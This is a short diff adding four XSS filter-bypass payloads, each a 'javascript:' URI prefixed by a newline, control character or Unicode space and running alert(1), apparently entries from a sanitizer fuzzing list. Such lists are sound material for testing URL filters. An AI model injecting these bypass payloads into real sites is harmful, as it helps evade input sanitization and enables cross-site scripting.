@@ -1,0 +1,4 @@
+javascript\x0A:javascript:alert(1)
+\x1Cjavascript:javascript:alert(1)
+\xE2\x81\x9Fjavascript:javascript:alert(1)
+\xE2\x80\x85javascript:javascript:alert(1)
